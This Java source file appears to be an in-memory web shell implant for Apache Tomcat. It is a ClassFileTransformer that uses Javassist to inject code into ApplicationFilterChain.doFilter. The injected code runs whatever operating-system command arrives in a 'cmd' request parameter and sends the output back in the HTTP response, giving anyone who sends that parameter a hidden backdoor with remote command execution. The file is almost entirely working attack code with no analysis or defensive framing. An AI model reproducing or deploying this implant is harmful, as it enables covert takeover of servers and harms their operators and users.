package com.zpchcbd.mem;

import javassist.*;

import java.io.IOException;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;

public class CMDTransformer implements ClassFileTransformer {
    public static String ClassName = "org.apache.catalina.core.ApplicationFilterChain";
    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        className = className.replace('/', '.');

        if (className.equals(ClassName)) {
            ClassPool cp = ClassPool.getDefault();
            if (classBeingRedefined != null) {
                ClassClassPath classPath = new ClassClassPath(classBeingRedefined);
                cp.insertClassPath(classPath);
            }
            CtClass cc;
            try {
                cc = cp.get(className);
                CtMethod m = cc.getDeclaredMethod("doFilter");
                m.insertBefore("javax.servlet.ServletRequest req = request;\n" +
                        "javax.servlet.ServletResponse res = response;\n" +
                        "String cmd = req.getParameter(\"cmd\");\n" +
                        "if (cmd != null) {\n" +
                        "Process process = Runtime.getRuntime().exec(cmd);\n" +
                        "java.io.BufferedReader bufferedReader = new java.io.BufferedReader(\n" +
                        "new java.io.InputStreamReader(process.getInputStream()));\n" +
                        "StringBuilder stringBuilder = new StringBuilder();\n" +
                        "String line;\n" +
                        "while ((line = bufferedReader.readLine()) != null) {\n" +
                        "stringBuilder.append(line + '\\n');\n" +
                        "}\n" +
                        "res.getOutputStream().write(stringBuilder.toString().getBytes());\n" +
                        "res.getOutputStream().flush();\n" +
                        "res.getOutputStream().close();\n" +
                        "}");
                byte[] byteCode = cc.toBytecode();
                cc.detach();
                return byteCode;
            } catch (NotFoundException | IOException | CannotCompileException e) {
                e.printStackTrace();
            }
        }
        return new byte[0];
    }
}